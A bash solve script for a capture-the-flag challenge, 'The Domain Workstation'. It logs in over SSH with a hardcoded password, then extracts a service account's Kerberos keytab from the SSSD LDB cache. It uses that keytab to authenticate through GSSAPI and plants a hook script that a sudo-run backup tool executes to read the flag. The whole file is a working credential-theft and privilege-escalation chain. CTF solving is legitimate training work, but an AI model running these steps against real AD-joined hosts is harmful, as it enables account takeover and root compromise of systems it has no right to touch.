#!/bin/bash
# ==============================================================================
# solve.sh - Automated Exploit & Verification for Challenge 2:
# "The Domain Workstation"
# ==============================================================================

HOST="${CHALL_HOST:-127.0.0.1}"
PORT="${CHALL_PORT:-2222}"
PASS="Amrane#SBA2026"

echo "[*] Target Workstation: ${HOST}:${PORT}"
echo "[*] Step 1: Connecting as Prof. A. AMRANE (a.amrane)..."

EXPLOIT_SCRIPT=$(cat << 'EOF'
# 1. Carve base64 keytab from SSSD LDB database
B64_KEY=$(ldbsearch -H /var/lib/sss/db/cache_ESI-SBA.DZ.ldb '(sAMAccountName=svc_ad_sync)' userKeytab | awk '/^userKeytab::/{flag=1; sub(/^userKeytab:: */, ""); printf "%s", $0; next} flag && /^ /{sub(/^ /, ""); printf "%s", $0; next} flag && !/^ /{flag=0}')

if [ -z "$B64_KEY" ]; then
    echo "[!] Could not extract userKeytab from SSSD database!"
    exit 1
fi

echo "[+] Extracted raw base64 keytab from SSSD LDB: ${B64_KEY:0:25}..."
echo "$B64_KEY" | base64 -d > /tmp/svc.keytab
chmod 600 /tmp/svc.keytab

# 2. Command payload to execute as svc_ad_sync
SVC_CMD='cat << "HOOK" > /opt/esi-sba/hooks/privesc.sh
#!/bin/bash
cat /flag
HOOK
chmod +x /opt/esi-sba/hooks/privesc.sh
sudo /usr/local/bin/sba-backup --run'

# 3. Race the 1-second Kerberos ticket lifetime in a single chained command:
echo "[*] Executing one-liner chain (kinit 1s ticket + SSH GSSAPI)..."
kinit -k -t /tmp/svc.keytab svc_ad_sync@ESI-SBA.DZ && ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -K svc_ad_sync@localhost "$SVC_CMD"
EOF
)

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$PORT" a.amrane@"$HOST" "$EXPLOIT_SCRIPT"
